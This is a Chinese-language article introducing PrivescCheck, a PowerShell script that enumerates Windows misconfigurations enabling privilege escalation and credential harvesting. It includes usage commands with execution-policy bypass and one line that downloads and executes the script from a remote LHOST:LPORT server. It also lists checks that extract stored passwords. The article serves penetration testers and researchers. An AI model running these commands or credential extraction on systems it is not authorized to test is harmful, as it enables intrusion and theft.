![](https://image.3001.net/images/20200305/1583402897_5e60cf91353f7.jpg!small)

##  PrivescCheck

**PrivescCheck是一款针对Windows系统的提权枚举脚本，该脚本能够枚举出目标Windows系统中常见的Windows错误安全配置，而这些错误的安全配置将允许攻击者在目标系统中实现信息收集以及权限提升，这些对于攻击者的漏洞利用以及后渗透攻击来说将非常有用。**

该工具基于[PowerUp](https://github.com/HarmJ0y/PowerUp)这款工具实现，并且添加了更多的检测机制，以降低工具的误报率。

目前，该项目仍处于开发阶段，因为我们还打算向其中添加更多的检测机制，不过该项目现已接近完工。

其实我本人非常喜欢PowerUp，因为它可以快速枚举出目标设备中的常见漏洞，而且无需借助第三方工具实现。但问题就在于，该工具已经多年未更新了，而且该工具有的时候返回的结果并不准确，存在一定的误报。

因此，在PrivescCheck脚本中我们考虑了以下几个方面：

> 1、不使用类似accesschk.exe之类的第三方工具；
>
> 2、不使用类似whoami.exe或netstat.exe之类的Windows内置命令；
>
> 3、不使用类似sc.exe或tasklist.exe之类的Windows内置工具；
>
> 4、不使用WMI；
>
> 5、必须兼容PowerShell v2；

##  工具下载

广大研究人员可以使用下列命令将项目源码克隆至本地：

    
    
    git clone https://github.com/itm4n/PrivescCheck.git

##  工具使用

我们可以直接在一个PowerShell命令行控制台中运行该脚本：

    
    
    PS C:\Temp\> Set-ExecutionPolicy Bypass -Scope Process -Force 
    
        PS C:\Temp\> . .\Invoke-PrivescCheck.ps1; Invoke-PrivescCheck

该工具在显示输出数据的同时，会将它们写入到一个日志文件中：

    
    
    PS C:\Temp\> . .\Invoke-PrivescCheck.ps1; Invoke-PrivescCheck | Tee-Object "C:\Temp\result.txt"

除此之外，我们也可以打开CMD命令行工具来使用该脚本：

    
    
    C:\Temp\>powershell -ep bypass -c ". .\Invoke-PrivescCheck.ps1; Invoke-PrivescCheck"

当然了，你也可以从一台远程Web服务器来导入并使用该脚本：

    
    
    C:\Temp\>powershell "IEX (New-Object Net.WebClient).DownloadString('http://LHOST:LPORT/Invoke-PrivescCheck.ps1'); Invoke-PrivescCheck"

##  功能介绍

###  获取当前用户信息

> Invoke-UserCheck - 获取当前用户的用户名和SID
>
> Invoke-UserGroupsCheck - 枚举当前用户所属的组（默认组和低特权组除外）
>
> Invoke-UserPrivilegesCheck - 枚举潜在高权限用户的令牌

###  获取目标设备服务

> Invoke-InstalledServicesCheck - 枚举非默认服务
>
> Invoke-ServicesPermissionsCheck - 枚举当前用户可以通过服务控制管理器修改的服务
>
> Invoke-ServicesPermissionsRegistryCheck - 枚举当前用户可在注册表中修改的服务
>
> Invoke-ServicesImagePermissionsCheck - E枚举具有可修改二进制文件（或参数）的所有服务
>
> Invoke-ServicesUnquotedPathCheck - 枚举具有可利用的未引用路径的服务

###  DLL劫持

    
    
    Invoke-DllHijackingCheck - 检查是否有任何系统路径文件夹可修改

###  程序/进程获取

> Invoke-InstalledProgramsCheck - 枚举默认情况下未安装的应用程序
>
> Invoke-ModifiableProgramsCheck - 枚举拥有DLL文件的可修改EXE的应用程序
>
> Invoke-RunningProcessCheck - 枚举正在运行的进程

###  获取凭据

> Invoke-SamBackupFilesCheck - 检查SAM/SYSTEM备份文件的常用位置
>
> Invoke-UnattendFilesCheck -枚举无人使用的文件并提取凭证
>
> Invoke-WinlogonCheck - 检查存储在Winlogon注册表项中的凭据
>
> Invoke-CredentialFilesCheck - 枚举存储在当前用户AppData文件夹中的凭据文件
>
> Invoke-VaultCredCheck - 枚举保存在凭据管理器中的凭据
>
> Invoke-VaultListCheck - 枚举保存在凭据管理器中的web凭据
>
> Invoke-GPPPasswordCheck - 枚举包含非空“cpassword”字段的组策略首选项（GPP）

###  获取注册表信息

> Invoke-UacCheck - 检查是否启用了UAC（用户访问控制）
>
> Invoke-LapsCheck - 检查是否启用了LAPS（本地管理密码解决方案）
>
> Invoke-PowershellTranscriptionCheck - 检查是否配置/启用了PowerShell转录
>
> Invoke-RegistryAlwaysInstallElevatedCheck -> 检查注册表中是否设置了AlwaysInstallElevated项
>
> Invoke-LsaProtectionsCheck - 检查LSASS是否作为受保护进程运行（附加检查）

###  获取网络信息

> Invoke-TcpEndpointsCheck - 枚举本地计算机（IPv4和IPv6）上的异常TCP节点
>
> Invoke-UdpEndpointsCheck - 枚举本地计算机（IPv4和IPv6）上的异常UDP节点

###  其他杂项

> Invoke-WindowsUpdateCheck - 检查目标设备的上次更新时间
>
> Invoke-SystemInfoCheck - 获取目标设备操作系统的名称和完整的版本字符串
>
> Invoke-LocalAdminGroupCheck - 枚举默认本地管理组的成员
>
> Invoke-MachineRoleCheck - 获取目标设备的角色（工作站、服务器、域控制器）
>
> Invoke-SystemStartupHistoryCheck - 获取目标设备系统启动事件的列表
>
> Invoke-SystemStartupCheck - 获取目标系统的上次启动时间
>
> Invoke-SystemDrivesCheck - 获取当前映射的本地驱动器和网络共享的列表

##  项目地址

> PrivescCheck：【[GitHub传送门](https://github.com/itm4n/PrivescCheck)】

 ***
参考来源：[itm4n](https://github.com/itm4n/PrivescCheck)，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM**

  

